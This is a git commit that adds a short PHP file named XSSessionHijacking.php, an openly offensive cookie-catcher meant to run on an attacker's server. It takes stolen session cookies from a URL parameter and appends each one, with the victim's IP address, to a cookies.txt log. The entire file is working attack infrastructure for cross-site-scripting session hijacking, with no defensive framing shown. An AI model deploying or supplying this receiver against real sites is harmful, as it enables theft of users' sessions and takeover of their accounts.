dde8e4714a8e7baff644e74bdfec9d902d8bd573
Shockp <59491201+Shockp@users.noreply.github.com>
2023-05-23 23:16:53 +0200

    Create XSSessionHijacking.php

---
+++ XSSessionHijacking.php
@@ -0,0 +1,13 @@
+#Create a file called index.php in /tmp/tmpserver/index.php
+
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
